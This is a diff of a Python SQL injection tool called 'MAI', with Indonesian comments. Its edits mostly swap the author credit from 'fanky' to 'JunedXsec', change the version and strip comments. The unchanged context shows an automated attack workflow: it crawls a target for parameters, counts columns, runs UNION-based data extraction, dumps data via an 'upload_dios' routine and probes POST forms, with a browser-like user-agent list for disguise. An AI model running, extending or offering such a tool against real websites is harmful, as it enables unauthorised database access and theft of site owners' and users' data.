@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 
 # --[MAI]--
-# Author: fanky
+# Author: JunedXsec
 # Inspired By: sqlmap, muani injection tools, psql-pro
-# Version: 4.1 (2026) - Professional Stable
+# Version: 4.2 (2026) - Stable
 
 import sys
 import os
@@ -24,7 +24,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # ==================== KONFIGURASI ====================
 TIMEOUT = 15
 DELAY = 0.5
-MAX_THREADS = 2                # Kurangi agar tidak terlalu agresif
+MAX_THREADS = 2
 MAX_COLUMNS = 30
 RETRY_COUNT = 2
 
@@ -34,7 +34,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 ]
 
-# Warna ANSI
 C = {
     'INFO': '\033[92m',
     'ERROR': '\033[91m',
@@ -45,7 +44,6 @@ C = {
     'CYAN': '\033[96m'
 }
 
-# Lock untuk output agar tidak kacau saat multi-thread
 print_lock = threading.Lock()
 
 def safe_print(msg):
@@ -63,7 +61,7 @@ def log_banner():
     safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]--{C['RESET']}")
     safe_print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
     safe_print("Inspired By: sqlmap, muani injection tools, psql-pro")
-    safe_print()
+    safe_print("")  # baris kosong
 
 # ==================== HTTP HELPER ====================
 session = requests.Session()
@@ -89,7 +87,7 @@ def fetch(url, params=None, post_data=None, retry=RETRY_COUNT):
             time.sleep(1)
     return None
 
-# ==================== CRAWLER (Discover Parameters) ====================
+# ==================== CRAWLER ====================
 class SmartParser(HTMLParser):
     def __init__(self, base_url):
         super().__init__()
@@ -140,7 +138,6 @@ def discover_endpoints(target):
         if params and link not in seen_urls:
             seen_urls.add(link)
             get_endpoints.append((link, params))
-    # Target asli jika punya parameter
     orig_params = extract_params_from_url(target)
     if orig_params and target not in seen_urls:
         get_endpoints.insert(0, (target, orig_params))
@@ -207,7 +204,6 @@ def union_extract(url, param, original_value, inj_type, trigger, num_cols):
         if found:
             visible = list(OrderedDict.fromkeys(found))
             log_info(f"Angka Yang Muncul: {', '.join(visible)}")
-            # Buat URL payload untuk ditampilkan (perbaiki duplikasi)
             parsed = urllib.parse.urlparse(url)
             base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
             payload_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
@@ -266,9 +262,8 @@ def scan_endpoint(url, params_dict):
         log_info(f"Jumlah Column: {num_cols}")
         if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
             upload_dios(url, param, orig_val, inj_type, trigger, num_cols)
-        break  # cukup satu parameter rentan per URL
+        break
 
-# ==================== MAIN ====================
 def main():
     clear_screen()
     log_banner()
@@ -276,11 +271,9 @@ def main():
     if not raw_target:
         log_error("URL tidak boleh kosong")
         sys.exit(1)
-    # Bersihkan URL
     target = raw_target.split()[0]
     if not target.startswith(('http://','https://')):
         target = 'http://' + target
-    # Hapus tanda kurung atau karakter aneh di akhir
     target = re.sub(r'[)\]}>]+$', '', target)
     
     get_endpoints, post_forms = discover_endpoints(target)
@@ -298,7 +291,6 @@ def main():
             except Exception as e:
                 log_error(f"Thread error: {e}")
     
-    # POST forms simple test
     for action, method, inputs in post_forms:
         log_info(f"Mencoba POST form: {action}")
         for field in inputs[:2]:
